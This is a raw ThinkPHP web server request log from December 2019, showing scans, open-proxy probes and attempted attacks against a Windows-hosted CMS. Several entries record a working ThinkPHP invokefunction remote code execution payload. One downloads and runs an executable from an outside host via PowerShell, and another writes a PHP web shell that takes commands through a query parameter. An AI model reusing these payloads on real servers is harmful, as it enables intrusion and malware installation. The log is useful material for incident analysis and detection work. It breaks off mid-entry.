---------------------------------------------------------------
[ 2019-12-05T01:18:57+08:00 ] 35.242.184.141 OPTIONS 114.115.146.220/
[运行时间：0.026407s] [吞吐率：37.87req/s] [内存消耗：471.28kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001182s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001216s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000909s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000331s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000238s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T01:22:16+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
[运行时间：0.020311s] [吞吐率：49.23req/s] [内存消耗：332.79kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001199s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001234s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T02:22:59+08:00 ] 223.71.167.155 GET 114.115.146.220:80/
[运行时间：0.025279s] [吞吐率：39.56req/s] [内存消耗：472.16kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001069s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001112s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000878s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000389s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000231s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T03:13:14+08:00 ] 103.212.90.13 GET 114.115.146.220:80/
[运行时间：0.028268s] [吞吐率：35.38req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001054s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001088s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000871s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000496s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000339s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T03:27:33+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
[运行时间：0.020527s] [吞吐率：48.72req/s] [内存消耗：345.38kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001090s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001124s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000215s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T03:27:33+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
[运行时间：0.011109s] [吞吐率：90.02req/s] [内存消耗：344.46kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000053s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000711s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000744s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
      0 => 'echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T03:27:33+08:00 ] 114.115.184.18 GET 114.115.146.220/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
[运行时间：0.010532s] [吞吐率：94.95req/s] [内存消耗：335.66kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000703s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000736s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'public',
    1 => 'hydra.php',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'xcmd' => 'cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T04:51:45+08:00 ] 185.153.196.97 GET 114.115.146.220:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
[运行时间：0.021522s] [吞吐率：46.46req/s] [内存消耗：342.23kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001192s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001225s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'md5',
    1 => 
    array (
      0 => 'HelloThinkPHP',
    ),
  ),
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T05:12:13+08:00 ] 198.108.66.32 GET 114.115.146.220/
[运行时间：0.025329s] [吞吐率：39.48req/s] [内存消耗：471.96kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001072s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001106s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000923s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000347s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T06:26:46+08:00 ] 71.6.232.9 GET 114.115.146.220/
[运行时间：0.025732s] [吞吐率：38.86req/s] [内存消耗：472.32kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001069s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001103s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000945s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000354s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T06:58:03+08:00 ] 185.243.50.41 GET 114.115.146.220:80/
[运行时间：0.026043s] [吞吐率：38.40req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001077s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001112s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000878s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000332s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T07:02:07+08:00 ] 128.199.149.20 GET 114.115.146.220/
[运行时间：0.025184s] [吞吐率：39.71req/s] [内存消耗：472.16kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001177s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001215s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000873s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000339s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:07:36+08:00 ] 198.143.158.178 GET 114.115.146.220/
[运行时间：0.024823s] [吞吐率：40.29req/s] [内存消耗：472.32kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001063s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001096s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000946s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000333s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:12:46+08:00 ] 13.76.152.162 GET 114.115.146.220/
[运行时间：0.025289s] [吞吐率：39.54req/s] [内存消耗：471.96kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001379s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001422s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000876s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000341s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:21:15+08:00 ] 34.212.247.190 POST 114.115.146.220/images.php
[运行时间：0.020030s] [吞吐率：49.93req/s] [内存消耗：332.95kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001104s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001141s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'images.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'content-length' => '0',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000218s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:32:51+08:00 ] 106.45.1.145 HEAD 123.125.114.144http://123.125.114.144/
[运行时间：0.025264s] [吞吐率：39.58req/s] [内存消耗：474.10kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001080s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001114s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.125.114.144',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'cache-control' => 'max-age=0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36Mozilla/5.01732016 Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000875s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000354s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:32:55+08:00 ] 124.89.89.150 CONNECT cn.bing.com:443cn.bing.com:443
[运行时间：0.017001s] [吞吐率：58.82req/s] [内存消耗：471.57kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000797s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000830s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'cn.bing.com:443',
  'proxy-authorization' => 'Basic Og==',
  'user-agent' => 'PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3',
  'proxy-connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000612s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000298s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000231s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T08:32:57+08:00 ] 36.32.3.233 GET www.rfa.orghttp://www.rfa.org/english/
[运行时间：0.011133s] [吞吐率：89.82req/s] [内存消耗：335.10kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000720s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000754s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'english',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.rfa.org',
  'proxy-authorization' => 'Basic Og==',
  'proxy-connection' => 'Keep-Alive',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
